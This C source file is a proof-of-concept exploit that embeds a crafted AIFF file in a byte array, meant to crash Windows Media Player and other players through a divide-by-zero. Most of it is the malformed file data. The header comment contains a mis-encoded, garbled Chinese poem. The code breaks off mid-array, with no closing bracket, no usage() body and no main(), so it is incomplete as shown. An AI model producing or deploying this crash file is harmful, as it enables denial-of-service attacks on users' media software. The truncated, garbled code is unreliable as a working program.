ï»¿/* 
 * Windows Media Player AIFF Divide By Zero Exception DOS POC
 * by Hong Gil-Dong, Jeon Woo-chi 

 * Jeong Ji-Sang (?âˆ¼1135), He was one of the most famous korean 
 * poet. This poem says sadness about good-bye'.

 * é€äºº

 * é›¨æ­‡é•·å ¤è‰è‰²å¤š
 * é€å›å—æµ¦å‹•æ‚²æ­Œ
 * å¤§åŒæ±Ÿæ°´ä½•æ™‚ç›¡
 * åˆ¥æ·šå¹´å¹´æ·»ç¶ æ³¢

 * If you open the kr.aiff in Window Media Player(WMP), WMP will
 * crash, and this crash will ocurr in other media players as well
 * as WMP.
 */


#include<stdio.h>

#define AIFF_FILE "kr.aiff"

void usage(void);

unsigned char aiff[] = {
	0x46,0x4F,0x52,0x4D,0x00,0x00,0x18,0x2E,0x41,0x49,0x46,0x46,
	0x43,0x4F,0x4D,0x4D,0x00,0x00,0x00,0x12,0x00,0x00,0x00,0x00,
	0x0B,0xF2,0x00,0x10,0x00,0x0B,0xFA,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x49,0x4E,0x53,0x54,0x00,0x00,0x00,0x14,0x40,0x00,
	0x00,0x7F,0x01,0x7F,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
	0x00,0x00,0x00,0x00,0x00,0x00,0x53,0x53,0x4E,0x44,0x00,0x00,
	0x17,0xEC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xFF,0xFB,
	0x00,0x03,0xFF,0xF7,0x00,0x04,0xFF,0xF2,0xFF,0xE0,0xFF,0x8E,
	0xFF,0x17,0xFE,0x3B,0xFD,0x91,0xFC,0xF7,0xFD,0x09,0xFC,0xD3,
	0xFD,0x02,0xFD,0x06,0xFE,0xB4,0x01,0x49,0x04,0x2F,0x05,0x8C,
	0x05,0xBC,0x05,0x16,0x03,0xF0,0x07,0x8F,0x0C,0xF3,0x10,0x02,
	0x0F,0x35,0x0D,0x45,0x0D,0x9F,0x14,0x8D,0x1A,0xB1,0x16,0xAA,
	0x04,0xF2,0xF3,0x39,0xEA,0x94,0xE6,0xB4,0xD8,0x2B,0xC8,0x2C,
	0xC1,0xBE,0xC2,0x77,0xCA,0x30,0xDD,0x4F,0x00,0x06,0x1F,0x45,
	0x28,0xB2,0x27,0xEB,0x31,0x17,0x45,0x79,0x4B,0x3B,0x34,0x65,
	0x1A,0xDC,0x15,0x4E,0x11,0xE3,0x01,0x30,0xF2,0xA7,0xF4,0x56,
	0xFA,0x74,0xF4,0xF0,0xE8,0xD3,0xEC,0xA6,0xFB,0x8C,0xF4,0x53,
	0xDD,0x70,0xCC,0xA6,0xD0,0xAB,0xD3,0x03,0xC1,0x40,0xB6,0xE7,
	0xC8,0x45,0xEB,0xFD,0x04,0x71,0x16,0xB6,0x2F,0xEE,0x4F,0xE2,
	0x5C,0x64,0x55,0x34,0x55,0x3C,0x5B,0x81,0x56,0xB7,0x36,0xD1,
	0x0C,0x7C,0xEE,0xAD,0xE0,0x2C,0xCA,0x3C,0xAF,0xE9,0xA0,0x5C,
	0x9F,0x93,0xAD,0x2E,0xBB,0x4A,0xD6,0x73,0xFA,0xF1,0x14,0x0C,
	0x14,0xEB,0x12,0x39,0x21,0x7E,0x36,0x47,0x39,0xF2,0x24,0x13,
	0x12,0x40,0x14,0xB4,0x1F,0xE9,0x24,0x92,0x26,0x93,0x26,0xE3,
	0x23,0x22,0x1B,0x8B,0x0D,0x7A,0x09,0x9F,0xFC,0x3C,0xDB,0x26,
	0xB5,0x89,0xA3,0x96,0xA9,0x08,0xB3,0x3F,0xB1,0xA9,0xAC,0x9E,
	0xC5,0x9C,0xEF,0x83,0x1D,0x1A,0x3C,0x73,0x4E,0x60,0x5D,0x30,
	0x63,0x25,0x60,0x4C,0x59,0x19,0x4B,0xD2,0x25,0x08,0xF2,0x3D,
	0xC5,0xF1,0xB6,0x47,0xBC,0x1C,0xB4,0xCE,0xA2,0xA5,0x9D,0x42,
	0xB6,0x7D,0xDE,0x66,0x02,0x7A,0x17,0x6A,0x27,0x0F,0x33,0x84,
	0x37,0x52,0x3E,0xFA,0x44,0xD4,0x3F,0x9F,0x26,0xE6,0x06,0xEB,
	0xF9,0x76,0x02,0xA4,0x06,0x2E,0xF6,0xD0,0xE2,0x44,0xDB,0xA6,
	0xE9,0xE9,0xF7,0x9A,0xF9,0xE3,0xEF,0xEC,0xE2,0xF3,0xD7,0xAC,
	0xD9,0x2C,0xE3,0x19,0xE8,0xFF,0xE8,0xED,0xDE,0x32,0xE3,0x18,
	0x00,0x08,0x23,0xC2,0x38,0x83,0x36,0xCA,0x34,0x9F,0x3F,0xC6,
	0x4F,0xD6,0x4B,0x37,0x32,0xE9,0x11,0x98,0xF2,0x72,0xDF,0xBB,
	0xD0,0xC6,0xC4,0xE8,0xB7,0xE3,0xAA,0x6E,0xA9,0x15,0xBE,0xC8,
	0xE2,0x04,0xFD,0xF2,0x06,0x69,0x05,0xAE,0x14,0xC2,0x2F,0x36,
	0x40,0x29,0x3A,0xA2,0x26,0x4F,0x15,0xAA,0x13,0x3A,0x15,0x13,
	0x13,0x7C,0x0D,0xD9,0xFE,0x2D,0xF2,0x30,0xF2,0xA1,0x00,0xEB,
	0x0D,0x35,0x03,0x0B,0xE8,0x65,0xD8,0x7B,0xE0,0x97,0xEC,0x75,
	0xEB,0x69,0xD8,0xDE,0xCC,0x7D,0xD5,0xDB,0xEB,0x90,0x03,0x7D,
	0x12,0xD4,0x19,0x69,0x1C,0xFE,0x27,0xF5,0x3B,0x3B,0x4F,0x89,
	0x4F,0x24,0x33,0x82,0x14,0xD2,0x05,0x3F,0x03,0x65,0xF8,0x58,
	0xD8,0x1D,0xB4,0xBB,0xA7,0x16,0xAE,0xB0,0xC0,0xC7,0xD1,0xB7,
	0xDC,0x1E,0xE7,0xE8,0xF7,0xF8,0x12,0xEF,0x34,0x62,0x4A,0x00,
	0x45,0x37,0x32,0x09,0x26,0xCD,0x2A,0x81,0x2E,0xFC,0x1B,0x68,
	0xFA,0xCE,0xE2,0xD7,0xDE,0x2B,0xE6,0x8D,0xEB,0x89,0xE8,0xA9,
	0xE1,0xAA,0xDE,0x3E,0xE2,0x50,0xF3,0x25,0x02,0x6C,0x00,0xDD,
	0xF1,0xA2,0xE4,0xFD,0xEE,0xF4,0x05,0x77,0x10,0x23,0x09,0x04,
	0x01,0xE6,0x09,0xD4,0x1F,0xFF,0x33,0x2C,0x37,0x0E,0x30,0x37,
	0x22,0x7D,0x16,0x19,0x10,0xA8,0x0C,0xC4,0xFD,0x79,0xDF,0x69,
	0xBE,0x43,0xB1,0xB5,0xBD,0xF2,0xCB,0x94,0xCE,0x54,0xCB,0x8E,
	0xD7,0x56,0xF7,0x3A,0x1B,0xDF,0x34,0x98,0x3F,0x17,0x40,0x49,
	0x3C,0xD7,0x3D,0xC3,0x3D,0xD3,0x36,0x6A,0x1E,0x15,0xF8,0x91,
	0xDD,0xC5,0xD8,0xE5,0xDE,0xA0,0xDA,0xAB,0xCB,0xEA,0xC2,0x4A,
	0xCE,0x56,0xE7,0x0F,0xFA,0x66,0x03,0x50,0x02,0xB9,0x02,0x23,
	0x07,0x28,0x11,0xB3,0x1C,0x3E,0x1C,0xA2,0x0E,0x36,0x01,0x25,
	0x05,0xDC,0x17,0x6A,0x23,0xCA,0x1C,0x5C,0x0C,0x99,0x07,0xDE,
	0x0F,0x79,0x14,0x06,0x0C,0x02,0xF7,0xCA,0xE1,0x8A,0xD3,0x80,
	0xCD,0xDA,0xD1,0xD3,0xD5,0x15,0xD0,0x78,0xCB,0xE6,0xD6,0xE7,
	0xF5,0xF7,0x19,0x01,0x2C,0x43,0x2D,0x8F,0x31,0x7D,0x3E,0x5E,
	0x4B,0x4F,0x4A,0x55,0x35,0xEA,0x19,0xBD,0xFF,0x31,0xEB,0xAB,
	0xE0,0x2F,0xD8,0x38,0xCA,0x6D,0xBA,0x06,0xB4,0x05,0xC2,0x9E,
	0xE0,0x92,0xF6,0xA4,0xFC,0x6A,0xFE,0xE8,0x0C,0x36,0x22,0x14,
	0x31,0xF6,0x30,0x78,0x24,0x35,0x18,0x26,0x10,0x85,0x10,0x75,
	0x12,0x3A,0x0E,0x36,0x01,0x4C,0xF3,0x6E,0xF1,0x71,0xFE,0x3A,
	0x08,0x66,0x00,0x7F,0xEE,0xC5,0xE2,0x74,0xE5,0x9E,0xEC,0xE6,
	0xEA,0x80,0xE0,0x6B,0xD8,0x5F,0xDA,0x4E,0xE7,0x77,0xFC,0x5D,
	0x0E,0xF7,0x1A,0x63,0x1E,0x05,0x24,0xAB,0x36,0xA1,0x47,0x23,
	0x46,0x2E,0x30,0x7B,0x15,0x95,0x05,0x36,0xFD,0x49,0xEF,0x22,
	0xD7,0xF1,0xC0,0xBE,0xB3,0x4F,0xB5,0xAA,0xC3,0x63,0xD6,0x11,
	0xE6,0xB1,0xF1,0x67,0xFC,0xAA,0x12,0xF6,0x2F,0x0B,0x40,0xE5,
	0x3E,0x6C,0x2E,0x44,0x24,0x3D,0x23,0xD5,0x21,0x55,0x13,0x32,
	0xFD,0x58,0xEA,0xBE,0xE3,0x44,0xE5,0x6A,0xEA,0x89,0xEE,0x94,
	0xEA,0xC1,0xE4,0x55,0xE5,0xDF,0xF1,0xE1,0xFF,0x18,0xFE,0xD1,
	0xF2,0x13,0xE9,0x5E,0xF0,0xBB,0xFF,0x87,0x09,0x53,0x09,0xAF,
	0x08,0x71,0x0F,0x95,0x1C,0xD5,0x2B,0x14,0x33,0xA1,0x30,0x7D,
	0x22,0xAD,0x13,0xBB,0x0B,0x05,0x06,0x7A,0xF9,0xC2,0xDE,0xED,
	0xC4,0x7E,0xBA,0x08,0xC0,0xAF,0xCC,0x02,0xD2,0x20,0xD6,0xB0,
	0xE4,0x45,0xFB,0xB2,0x17,0x19,0x2F,0xC7,0x3D,0x1F,0x3E,0x9E,
	0x38,0xB0,0x33,0xF6,0x33,0x54,0x2D,0x16,0x17,0x59,0xF8,0x90,
	0xE2,0x27,0xDB,0x68,0xDD,0xFD,0xDB,0x73,0xD3,0x7F,0xD0,0xA7,
	0xD7,0xE4,0xE7,0xA2,0xF8,0x47,0x03,0x63,0x06,0x42,0x04,0x28,
	0x03,0xB9,0x0B,0xB3,0x16,0x74,0x17,0x3C,0x0D,0x5A,0x03,0xD0,
	0x07,0x48,0x15,0x05,0x1D,0xF2,0x1A,0xA0,0x12,0x42,0x0D,0x16,
	0x0D,0x1E,0x0D,0x4E,0x06,0xD7,0xF9,0x23,0xE5,0xF6,0xD4,0x8C,
	0xCD,0xD5,0xD2,0x00,0xD6,0xC0,0xD5,0xA7,0xD4,0x28,0xDE,0xE8,
	0xF9,0xF0,0x16,0x72,0x28,0x48,0x2F,0x44,0x33,0xA2,0x3A,0xB3,
	0x40,0x1E,0x3D,0x24,0x2F,0x28,0x18,0x55,0xFD,0x5B,0xE8,0xC9,
	0xDE,0x57,0xD8,0x91,0xCF,0xAD,0xC2,0xD6,0xBE,0xD8,0xCC,0x4C,
	0xE3,0xCB,0xF6,0x9B,0xFF,0xA2,0x04,0xE5,0x0E,0xF6,0x1C,0xDE,
	0x26,0xAF,0x28,0xCF,0x22,0x3B,0x16,0x94,0x0D,0x36,0x0B,0x3B,
	0x0E,0x29,0x0D,0xA3,0x03,0xA4,0xF7,0xEF,0xF6,0xBF,0xFE,0xE7,
	0x05,0x2D,0xFF,0xB3,0xF2,0x5D,0xE8,0x7F,0xE6,0x93,0xE7,0xA2,
	0xE6,0xF5,0xE3,0x3F,0xDE,0x5E,0xDE,0xE2,0xE8,0x6A,0xFB,0x75,
	0x0F,0xF3,0x1B,0x96,0x1F,0xBF,0x26,0x23,0x33,0x61,0x3E,0xEC,
	0x3C,0xF1,0x2B,0x2F,0x15,0x57,0x04,0x2D,0xF6,0xBB,0xE9,0x38,
	0xD8,0xA5,0xC8,0x1A,0xBC,0xF4,0xBC,0x14,0xC7,0xCD,0xDB,0x9A,
	0xEC,0xB4,0xF7,0x36,0x01,0xF2,0x13,0xD6,0x2A,0x5E,0x38,0x56,
	0x36,0x5D,0x2B,0x6A,0x22,0x12,0x1C,0xD7,0x17,0x9C,0x0D,0x44,
	0xFE,0x90,0xF0,0x97,0xE7,0x1E,0xE6,0x71,0xEC,0xB7,0xF1,0xDC,
	0xEF,0xCA,0xE9,0xE6,0xE9,0x8D,0xF2,0x62,0xFB,0xD4,0xFB,0x09,
	0xF3,0x0B,0xED,0x9F,0xF1,0x86,0xFB,0xDC,0x04,0xBD,0x09,0xFE,
	0x0D,0x8A,0x12,0x5F,0x1A,0xEE,0x27,0x06,0x2F,0xBC,0x2E,0x10,
	0x21,0x5A,0x11,0xA3,0x08,0x30,0x01,0x95,0xF4,0x75,0xDF,0x15,
	0xCA,0x7F,0xC1,0x2C,0xC4,0x93,0xCD,0x44,0xD6,0x55,0xE0,0x67,
	0xED,0x8B,0xFF,0xCF,0x16,0x48,0x2B,0xF8,0x39,0xAB,0x3A,0xE1,
	0x33,0xD9,0x2E,0x06,0x2A,0x8F,0x21,0xE8,0x0F,0x38,0xF7,0x2E,
	0xE5,0x05,0xDD,0x41,0xDB,0x2E,0xD8,0xDC,0xD6,0xCF,0xD8,0x3D,
	0xDF,0x7D,0xEB,0xCA,0xF8,0xC1,0x04,0x5B,0x0A,0x91,0x0C,0xD2,
	0x0F,0xB4,0x14,0x33,0x18,0x73,0x17,0x0E,0x11,0x23,0x0B,0x5C,
	0x09,0x05,0x0A,0xCA,0x0B,0xFA,0x0A,0xFF,0x06,0xCF,0x00,0x8E,
	0xFC,0xC4,0xFB,0x02,0xF9,0x1A,0xF3,0x3C,0xE9,0x45,0xE2,0x58,
	0xE1,0xDC,0xE6,0x58,0xEA,0x48,0xEB,0x3E,0xEF,0x69,0xFA,0xFB,
	0x09,0xD3,0x15,0x26,0x1B,0x18,0x1E,0x56,0x21,0xA6,0x21,0xE7,
	0x1C,0x75,0x13,0x17,0x07,0xD9,0xFE,0xA4,0xF5,0xBE,0xED,0x7D,
	0xE8,0x77,0xE6,0x9A,0xE9,0x3B,0xEA,0xC4,0xED,0x7F,0xF3,0x2F,
	0xFA,0xDB,0x03,0xFB,0x06,0x07,0x05,0x82,0x05,0xC7,0x07,0x3F,
	0x0A,0x49,0x06,0x33,0x00,0x28,0xFD,0x16,0xFF,0xEB,0x06,0xE2,
	0x08,0xDA,0x0A,0x33,0x0D,0xE7,0x16,0x67,0x1D,0x21,0x18,0x7D,
	0x0E,0x47,0x01,0x22,0xF6,0x41,0xEA,0x52,0xD9,0x98,0xCB,0x62,
	0xC2,0x5A,0xC3,0x6C,0xCA,0xD4,0xD6,0xBB,0xEB,0x0E,0x03,0x8E,
	0x1F,0xDF,0x39,0x01,0x4D,0x80,0x5C,0xB2,0x60,0xC2,0x5A,0x5B,
	0x46,0x5F,0x29,0xFD,0x09,0x5B,0xE6,0x65,0xC5,0x4C,0xA5,0x27,
	0x8E,0x1B,0x86,0x92,0x8F,0x85,0xA6,0x2D,0xC1,0xDA,0xE2,0x30,
	0x07,0x97,0x32,0x95,0x59,0xEF,0x71,0xDC,0x78,0xF6,0x71,0xF8,
	0x63,0xCC,0x4C,0xDA,0x2B,0x5C,0x04,0x67,0xDD,0x84,0xBF,0x0C,
	0xA8,0x6D,0x9D,0x0C,0x9E,0xAB,0xAA,0x3B,0xBD,0xD5,0xD3,0x1A,
	0xEE,0x59,0x0E,0x0A,0x2B,0x89,0x40,0x2C,0x44,0xF6,0x43,0xD8,
	0x3F,0xB8,0x37,0x91,0x28,0x13,0x0E,0x2F,0xF5,0x4F,0xE1,0xB3,
	0xD7,0x1E,0xD3,0x4D,0xD1,0x97,0xD6,0x42,0xDE,0xDB,0xEE,0x4C,
	0x00,0xEA,0x10,0xB3,0x1D,0x69,0x21,0x7A,0x21,0xA1,0x1D,0x62,
	0x14,0xAD,0x0B,0x2F,0xFD,0x48,0xEF,0xC8,0xE2,0x36,0xD8,0x9E,
	0xD8,0xE4,0xDE,0x8D,0xE8,0x36,0xEF,0xBF,0xF9,0x59,0x0A,0x18,
	0x1C,0xEC,0x2C,0xCB,0x30,0xF8,0x2E,0xAC,0x2B,0xDB,0x27,0x2A,
	0x1E,0x78,0x0C,0x9C,0xF7,0xC8,0xE5,0x05,0xD5,0xB2,0xCA,0xFB,
	0xC3,0x69,0xC2,0x3C,0xC6,0x6E,0xCF,0x3B,0xDD,0x6D,0xF1,0x15,
	0x09,0xA7,0x20,0x4E,0x31,0x8B,0x3D,0x24,0x45,0xBA,0x4B,0xF1,
	0x4A,0x48,0x3E,0x47,0x28,0x68,0x0F,0x31,0xF7,0x7B,0xE1,0xCA,
	0xCD,0x4F,0xB8,0xBB,0xAA,0x3D,0xA6,0x02,0xAE,0x55,0xC0,0x01,
	0xD4,0x49,0xEC,0x18,0x06,0x3B,0x23,0x25,0x3E,0x18,0x50,0x7D,
	0x5A,0xAA,0x59,0xFC,0x50,0xA6,0x3E,0x91,0x25,0xD8,0x0C,0x39,
	0xF0,0x21,0xD4,0x87,0xBB,0x45,0xAB,0x59,0xAA,0xB3,0xB3,0x01,
	0xC1,0x4F,0xD1,0x9A,0xE7,0xF1,0x06,0x4E,0x23,0x21,0x39,0x37,
	0x42,0xD2,0x44,0x3B,0x40,0xF1,0x36,0x2C,0x25,0x8E,0x0D,0xC1,
	0xF5,0x11,0xDF,0x76,0xCE,0xF7,0xC8,0x11,0xC8,0x77,0xD1,0x30,
	0xDE,0xE6,0xEF,0xCF,0x04,0xF9,0x1A,0x04,0x2C,0xE5,0x37,0x64,
	0x37,0x2F,0x2E,0xB4,0x1F,0xEB,0x0F,0x26,0xFB,0x24,0xE4,0x24,
	0xCD,0x68,0xBC,0xFA,0xB9,0x78,0xC1,0x0D,0xCF,0xA1,0xE1,0x5D,
	0xF7,0x75,0x13,0xA9,0x30,0xE2,0x48,0x88,0x54,0xDF,0x56,0xAB,
	0x4F,0x8B,0x3F,0x83,0x27,0x6B,0x09,0x19,0xE9,0xC5,0xCB,0x47,
	0xB0,0xED,0x9F,0x30,0x99,0xFC,0xA3,0x26,0xB4,0x8D,0xCB,0x82,
	0xE7,0x70,0x08,0xDE,0x2D,0x74,0x4A,0xF2,0x5D,0x03,0x62,0x99,
	0x5F,0x4E,0x55,0xB2,0x42,0x91,0x27,0x90,0x06,0x12,0xE4,0xFF,
	0xCA,0x28,0xB6,0x62,0xAC,0x42,0xA8,0xC4,0xAD,0xA1,0xBB,0x61,
	0xCF,0xDC,0xEA,0x9D,0x05,0x00,0x1D,0x2B,0x30,0x1F,0x3B,0xD1,
	0x42,0x18,0x41,0x67,0x3C,0x03,0x2F,0xE0,0x1C,0xF4,0x08,0x1C,
	0xF5,0x0F,0xE8,0xDA,0xDF,0xD7,0xD7,0x7A,0xD2,0x0F,0xD2,0xA3,
	0xDC,0x9D,0xE9,0xD6,0xF5,0x61,0xFE,0xA1,0x07,0x05,0x10,0xE1,
	0x18,0x1C,0x1A,0xDD,0x19,0x13,0x13,0xF9,0x0D,0x6D,0x05,0x0D,
	0xFD,0x8D,0xF7,0xBC,0xF3,0x69,0xEF,0xB7,0xEC,0xD2,0xEE,0x80,
	0xF5,0x29,0xFE,0xA2,0x06,0xA8,0x0B,0xDF,0x10,0xA0,0x15,0xF1,
	0x1A,0xDB,0x1B,0x02,0x15,0x08,0x0A,0x6A,0xFE,0xAC,0xF4,0xD2,
	0xEB,0x26,0xE1,0x4D,0xD7,0x75,0xD1,0x72,0xD3,0x18,0xDA,0xF3,
	0xE7,0x9C,0xF5,0xF3,0x06,0x42,0x18,0x75,0x29,0x8B,0x38,0x47,
	0x41,0x43,0x44,0x14,0x3E,0xB8,0x30,0x39,0x1C,0xDB,0x06,0x92,
	0xF0,0x51,0xD8,0x9C,0xC0,0x74,0xAE,0xF5,0xA7,0xEE,0xAD,0x79,
	0xBA,0x42,0xCB,0x51,0xE2,0x91,0xFF,0x56,0x20,0x1E,0x3D,0x04,
	0x51,0x8C,0x5C,0xE7,0x5E,0x30,0x57,0x30,0x46,0x5B,0x2D,0xD1,
	0x0F,0xFA,0xEF,0x0E,0xD0,0x8F,0xB7,0x5A,0xA8,0x2C,0xA3,0xB9,
	0xA8,0x54,0xB5,0xC7,0xCA,0x33,0xE5,0xCD,0x05,0x27,0x23,0x21,
	0x3A,0xD4,0x48,0x7C,0x4D,0x8A,0x4B,0x07,0x41,0xB8,0x30,0x6E,
	0x17,0x36,0xFB,0x71,0xE3,0x15,0xD2,0x74,0xC8,0xBC,0xC4,0x68,
	0xC6,0xB2,0xD1,0x15,0xE3,0x39,0xF8,0x93,0x0D,0x29,0x1E,0x4F,
	0x2A,0x5D,0x2F,0xE6,0x2D,0x8E,0x25,0x60,0x18,0x8E,0x07,0xF6,
	0xF4,0x79,0xE0,0xDA,0xD3,0x7F,0xCE,0x97,0xD1,0x3A,0xD8,0x4A,
	0xE2,0xFB,0xF3,0xE1,0x09,0x57,0x1F,0xD3,0x31,0x0C,0x3A,0x3F,
	0x3C,0xC5,0x38,0x96,0x2F,0x21,0x1E,0xE4,0x08,0xF4,0xF0,0xA4,
	0xD8,0xDF,0xC6,0xDA,0xBB,0x6C,0xB7,0x98,0xBB,0x50,0xC5,0x72,
	0xD6,0xF4,0xED,0x4C,0x06,0xDE,0x20,0x47,0x35,0x5D,0x44,0x3A,
	0x4A,0x82,0x4A,0x4A,0x44,0x2C,0x37,0x52,0x23,0xB3,0x09,0xDE,
	0xF0,0x4A,0xDB,0x4B,0xCB,0xB5,0xC0,0x6C,0xB8,0x76,0xB7,0xE1,
	0xC0,0x4D,0xD0,0x43,0xE3,0xC8,0xF7,0x5B,0x0B,0x25,0x1D,0xBC,
	0x2D,0xB1,0x38,0xE9,0x3E,0x45,0x3D,0xFE,0x37,0x03,0x2A,0x7C,
	0x1A,0x99,0x0A,0x3B,0xFA,0x95,0xEA,0xAD,0xDB,0xA2,0xD0,0x1C,
	0xCB,0x61,0xCD,0x7F,0xD3,0xEB,0xDC,0x90,0xE6,0xEF,0xF4,0x71,
	0x04,0x2F,0x13,0xBC,0x1F,0x9A,0x25,0xB4,0x27,0x79,0x25,0xE6,
	0x21,0xFB,0x1A,0x5E,0x0E,0x97,0x01,0x06,0xF4,0x1C,0xEA,0xC0,
	0xE4,0xAF,0xE2,0x1D,0xE3,0x7B,0xE8,0x13,0xF0,0x1D,0xF9,0xE0,
	0x05,0x56,0x10,0xEE,0x19,0x0B,0x1C,0x23,0x19,0x98,0x14,0xA8,
	0x0E,0x37,0x04,0x5C,0xF7,0x17,0xE8,0x30,0xDD,0x7E,0xD9,0x39,
	0xDA,0x2F,0xDF,0x1A,0xE7,0x2F,0xF4,0xA4,0x06,0x28,0x18,0xEB,
	0x29,0xD7,0x35,0x85,0x3B,0x8D,0x3A,0x41,0x32,0x04,0x23,0xE6,
	0x10,0x6A,0xF9,0xA1,0xE0,0xD0,0xCA,0x1B,0xB9,0x7C,0xB1,0x46,
	0xB2,0x64,0xBB,0x1A,0xCB,0x16,0xE1,0xA3,0xFD,0xA7,0x1C,0x3A,
	0x37,0xD9,0x4C,0x53,0x57,0x3B,0x59,0x59,0x53,0x87,0x44,0xCE,
	0x2D,0x04,0x0E,0x3E,0xEE,0x0E,0xD1,0x98,0xBB,0x68,0xAC,0x5E,
	0xA5,0x8A,0xA8,0xD9,0xB6,0x2A,0xCB,0xD6,0xE6,0xD6,0x04,0x0A,
	0x20,0x38,0x36,0xFF,0x46,0x15,0x4C,0xEA,0x4C,0x49,0x43,0xF8,
	0x32,0xE0,0x1B,0x52,0x01,0xB9,0xEB,0x5A,0xDA,0x25,0xCD,0x65,
	0xC5,0xF8,0xC5,0x1E,0xCC,0xD7,0xDB,0x89,0xED,0x77,0xFF,0xA3,
	0x0F,0x24,0x1B,0xCB,0x24,0x6A,0x27,0xFB,0x26,0x10,0x1D,0xEC,
	0x11,0xC9,0x03,0xA2,0xF6,0x55,0xEB,0xEB,0xE4,0xB4,0xE1,0xD9,
	0xE2,0xD2,0xE8,0x32,0xF1,0xD7,0xFE,0x61,0x0C,0x3C,0x17,0x80,
	0x1E,0x94,0x21,0x7F,0x21,0x2E,0x1E,0x14,0x15,0xE2,0x08,0xB6,
	0xF9,0x03,0xEA,0xCD,0xE0,0x8D,0xD9,0x2F,0xD4,0xA2,0xD3,0xD8,
	0xD8,0xCB,0xE3,0x87,0xF1,0xA5,0x01,0x71,0x10,0xFD,0x1F,0x15,
	0x2A,0x24,0x30,0xFC,0x33,0xBE,0x31,0xBE,0x2A,0x4F,0x1D,0x56,
	0x0C,0xE4,0xFC,0x18,0xEC,0x8E,0xDE,0x8E,0xD2,0x10,0xC9,0x0A,
	0xC5,0xD7,0xC9,0x81,0xD2,0xF2,0xDF,0xD2,0xEE,0xE7,0xFF,0x9B,
	0x11,0xA0,0x23,0x2E,0x31,0x61,0x3A,0x0C,0x3C,0x53,0x39,0x38,
	0x31,0x5E,0x24,0xEB,0x14,0x49,0x00,0xC4,0xED,0x0A,0xDB,0x42,
	0xCD,0x7B,0xC5,0x27,0xC2,0xE6,0xC6,0xC2,0xCF,0xB9,0xDD,0x8C,
	0xEF,0xC2,0x04,0x75,0x18,0x42,0x27,0xA7,0x31,0xC8,0x37,0x1D,
	0x37,0xA2,0x31,0xFC,0x25,0x6C,0x14,0x22,0x01,0x8A,0xF0,0x99,
	0xE2,0x76,0xD7,0xC3,0xD1,0xE6,0xD1,0xEC,0xD8,0x2F,0xE3,0x9D,
	0xF2,0x6D,0x02,0x62,0x10,0xDC,0x1C,0x04,0x22,0xBE,0x24,0xCB,
	0x21,0xCF,0x19,0x76,0x0C,0x8F,0xFD,0x44,0xEE,0xD5,0xE3,0xB6,
	0xDD,0x10,0xDB,0x1A,0xDD,0xE8,0xE6,0x27,0xF3,0xBD,0x04,0xEE,
	0x16,0x3D,0x24,0x3B,0x2D,0x4F,0x31,0x35,0x2F,0xA8,0x27,0x8E,
	0x18,0xA6,0x04,0xC4,0xEF,0x4B,0xDB,0x78,0xCB,0x6B,0xC1,0x07,
	0xBD,0xBF,0xC2,0x69,0xCE,0xA3,0xE1,0x40,0xF8,0xD8,0x12,0xA3,
	0x2A,0xC8,0x3D,0x73,0x48,0xD3,0x4C,0xE6,0x49,0x47,0x3D,0x3D,
	0x28,0xA9,0x0E,0x6D,0xF3,0x28,0xDA,0x64,0xC6,0x66,0xB7,0xF7,
	0xB0,0xD6,0xB2,0xAB,0xBD,0xA5,0xD0,0x8B,0xE8,0x0F,0x01,0x47,
	0x19,0x29,0x2D,0x7E,0x3C,0xDD,0x45,0x4E,0x46,0x15,0x3E,0xA1,
	0x30,0x52,0x1D,0xA0,0x08,0xEA,0xF5,0x22,0xE3,0xB1,0xD5,0xFC,
	0xCD,0x0D,0xC9,0xBB,0xCD,0x5C,0xD6,0xFC,0xE4,0x61,0xF2,0x9A,
	0xFF,0xF8,0x0C,0xBF,0x18,0x15,0x20,0x3C,0x22,0xFC,0x20,0x4B,
	0x1A,0x68,0x12,0xF3,0x0A,0xC9,0x01,0xD6,0xF9,0x1A,0xF2,0x49,
	0xEE,0x2B,0xED,0x2E,0xEE,0xFB,0xF3,0x45,0xF9,0x11,0xFE,0xDB,
	0x04,0x0D,0x08,0xA0,0x0C,0x9B,0x0E,0xBF,0x0D,0xB8,0x09,0x9C,
	0x03,0xED,0xFE,0x71,0xF9,0x48,0xF4,0x18,0xEE,0xFB,0xEB,0x3B,
	0xEA,0x86,0xED,0x2F,0xF2,0x90,0xF9,0x37,0x00,0x80,0x08,0x7B,
	0x10,0xF9,0x19,0x2C,0x1F,0x0D,0x21,0x78,0x20,0x29,0x1B,0x96,
	0x14,0x64,0x0A,0x86,0xFE,0xC6,0xF1,0xF7,0xE5,0x56,0xDA,0x7A,
	0xD2,0xCE,0xD0,0x1E,0xD2,0x7D,0xD9,0x1E,0xE3,0x48,0xF0,0xCF,
	0x01,0xF2,0x14,0x95,0x25,0x81,0x32,0x07,0x39,0x52,0x3C,0x0A,
	0x39,0x6A,0x30,0x90,0x21,0x58,0x0D,0x7B,0xF8,0x31,0xE3,0xA4,
	0xD1,0xEB,0xC4,0x9A,0xBD,0x17,0xBC,0x8F,0xC3,0x08,0xD0,0x78,
	0xE3,0x84,0xF9,0xE5,0x10,0xA2,0x24,0xAE,0x34,0x94,0x3F,0x07,
	0x43,0x06,0x3F,0x8C,0x34,0x45,0x22,0xE2,0x0E,0x07,0xF8,0xF8,
	0xE5,0xEA,0xD6,0x28,0xCB,0x05,0xC5,0xFB,0xC8,0x9B,0xD2,0x9B,
	0xE1,0xCA,0xF3,0x2D,0x04,0x88,0x14,0xA6,0x21,0xF3,0x2A,0x87,
	0x2C,0xB4,0x28,0x58,0x1E,0xB4,0x11,0x5A,0x02,0x4E,0xF3,0xB2,
	0xE7,0xB3,0xDF,0xA0,0xDC,0x0F,0xDD,0xB5,0xE4,0xF4,0xF1,0x47,
	0x00,0x19,0x0E,0x3F,0x19,0xE0,0x22,0x39,0x26,0xE6,0x26,0x56,
	0x1F,0x72,0x12,0xEE,0x02,0xFF,0xF2,0xB1,0xE3,0xCE,0xD7,0xCC,
	0xD0,0x00,0xCD,0x9C,0xD1,0xC5,0xDC,0x34,0xEB,0xEA,0xFE,0xA3,
	0x11,0xBE,0x23,0x21,0x30,0xBB,0x39,0x7F,0x3C,0x1F,0x37,0xE1,
	0x2C,0xFD,0x1C,0x59,0x08,0x64,0xF3,0xAB,0xE0,0xBF,0xD1,0x50,
	0xC6,0x3D,0xC0,0xD8,0xC2,0x41,0xCB,0x1F,0xDA,0x0E,0xEC,0x27,
	0xFF,0x21,0x11,0x8F,0x22,0x9B,0x30,0x6C,0x38,0xB0,0x3A,0x54,
